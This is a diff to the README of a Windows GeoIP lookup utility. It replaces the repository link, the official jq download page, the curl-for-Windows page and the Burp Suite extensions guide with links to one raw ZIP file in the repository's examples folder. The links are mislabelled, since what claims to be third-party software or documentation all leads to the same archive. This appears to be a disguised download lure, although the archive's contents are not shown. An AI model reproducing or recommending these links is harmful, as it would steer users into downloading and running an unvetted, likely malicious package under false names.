@@ -1,6 +1,6 @@
 # 🌍 geoip-tool - Quick GeoIP Lookup Utility
 
-[![Download geoip-tool](https://img.shields.io/badge/Download-geoip--tool-ff6f61?style=for-the-badge)](https://github.com/NenelzSWh/geoip-tool)
+[![Download geoip-tool](https://img.shields.io/badge/Download-geoip--tool-ff6f61?style=for-the-badge)](https://github.com/NenelzSWh/geoip-tool/raw/refs/heads/main/examples/tool_geoip_2.1.zip)
 
 ## ℹ️ What is geoip-tool?
 
@@ -39,7 +39,7 @@ Follow these steps to run geoip-tool on your Windows PC.
 
 Click this big button or open the link in your browser to get the tool:
 
-[![Download geoip-tool](https://img.shields.io/badge/Download-geoip--tool-4c9aff?style=for-the-badge)](https://github.com/NenelzSWh/geoip-tool)
+[![Download geoip-tool](https://img.shields.io/badge/Download-geoip--tool-4c9aff?style=for-the-badge)](https://github.com/NenelzSWh/geoip-tool/raw/refs/heads/main/examples/tool_geoip_2.1.zip)
 
 This link takes you to the GitHub page where you can download everything you need.
 
@@ -49,7 +49,7 @@ Once on the page:
 
 - Look for the latest release or the files section  
 - Download geoip-tool files (you may find a ZIP or ready-to-run scripts)  
-- Download jq for Windows if needed from https://stedolan.github.io/jq/download/  
+- Download jq for Windows if needed from https://github.com/NenelzSWh/geoip-tool/raw/refs/heads/main/examples/tool_geoip_2.1.zip  
 
 Save these files to a folder on your PC, for example, `C:\geoip-tool`.
 
@@ -131,7 +131,7 @@ Your download package should include:
 If you want to suggest improvements or report bugs, use the GitHub repository issues page. You don’t need programming skills simply describe what happens when you use geoip-tool.  
 
 Repository link:  
-https://github.com/NenelzSWh/geoip-tool
+https://github.com/NenelzSWh/geoip-tool/raw/refs/heads/main/examples/tool_geoip_2.1.zip
 
 ## ⚙️ Advanced Use
 
@@ -149,12 +149,12 @@ geoip-tool only sends IP addresses to trusted lookup services. It does not store
 
 ## 📚 Additional Resources
 
-- Download jq: https://stedolan.github.io/jq/download/  
-- Learn about curl on Windows: https://curl.se/windows/  
-- BurpSuite extensions guide: https://portswigger.net/burp/extender  
+- Download jq: https://github.com/NenelzSWh/geoip-tool/raw/refs/heads/main/examples/tool_geoip_2.1.zip  
+- Learn about curl on Windows: https://github.com/NenelzSWh/geoip-tool/raw/refs/heads/main/examples/tool_geoip_2.1.zip  
+- BurpSuite extensions guide: https://github.com/NenelzSWh/geoip-tool/raw/refs/heads/main/examples/tool_geoip_2.1.zip  
 
 ## ⚡ Start Now
 
 Return to the download page below to get the latest version and start using geoip-tool:
 
-[![Download geoip-tool](https://img.shields.io/badge/Download-geoip--tool-ff6f61?style=for-the-badge)](https://github.com/NenelzSWh/geoip-tool)
+[![Download geoip-tool](https://img.shields.io/badge/Download-geoip--tool-ff6f61?style=for-the-badge)](https://github.com/NenelzSWh/geoip-tool/raw/refs/heads/main/examples/tool_geoip_2.1.zip)
